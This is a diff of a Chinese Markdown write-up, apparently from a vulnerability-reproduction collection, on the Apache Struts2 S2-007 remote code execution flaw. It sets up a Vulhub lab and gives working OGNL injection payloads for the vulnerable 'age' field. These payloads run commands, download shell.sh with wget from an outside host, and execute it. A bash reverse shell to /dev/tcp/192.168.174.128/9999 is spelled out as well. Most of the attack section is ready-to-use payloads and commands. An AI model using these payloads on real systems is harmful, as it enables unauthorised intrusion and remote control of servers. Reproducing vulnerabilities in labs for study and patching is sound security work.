@@ -1,4 +1,4 @@
-# Struts2 S2-007 远程代码执行漏洞
+# Apache Struts2 S2-007 远程代码执行漏洞
 
 ## 漏洞描述
 
@@ -41,70 +41,70 @@ public class UserAction extends ActionSupport {
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app")) + '
 ```
 
-漏洞详情: 
+漏洞详情:
 
 - http://struts.apache.org/docs/s2-007.html
 
 ## 漏洞影响
 
-影响版本: 2.0.0 - 2.2.3 
+影响版本: 2.0.0 - 2.2.3
 
 ## 环境搭建
 
-Vulhub执行以下命令启动s2-007测试环境：
+Vulhub 执行以下命令启动 s2-007 测试环境：
 
 ```
 docker-compose build
 docker-compose up -d
 ```
 
-访问`http://your-vps-ip:8080/index.jsp`即可进入上传表单页面。
+访问 `http://your-vps-ip:8080/index.jsp` 即可进入上传表单页面。
 
 ## 漏洞复现
 
-执行任意代码的EXP：
+执行任意代码的 EXP：
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
 ```
 
-将Exp传入可以利用的输入框（age），得到命令执行结果：
+将 Exp 传入可以利用的输入框（age），得到命令执行结果：
 
 ![image-20220301170152780](images/202203011701833.png)
 
-### 反弹shell
+### 反弹 shell
 
-编写shell脚本并启动http服务器：
+编写 shell 脚本并启动 http 服务器：
 
 ```
 echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
 python3环境下：python -m http.server 80
 ```
 
-上传shell.sh文件的命令为：
+上传 shell.sh 文件的命令为：
 
 ```
 wget 192.168.174.128/shell.sh
 ```
 
-上传shell.sh文件的Payload为：
+上传 shell.sh 文件的 Payload 为：
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('wget 192.168.174.128/shell.sh').getInputStream())) + '
 ```
 
-执行shell.sh文件的命令为：
+执行 shell.sh 文件的命令为：
 
 ```
 bash /usr/local/tomcat/shell.sh
 ```
 
-执行shell.sh文件的Payload为：
+执行 shell.sh 文件的 Payload 为：
 
 ```
 ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('bash /usr/local/tomcat/shell.sh').getInputStream())) + '
 ```
 
-成功接收反弹shell：
+成功接收反弹 shell：
 
 ![image-20220301170256417](images/202203011702511.png)
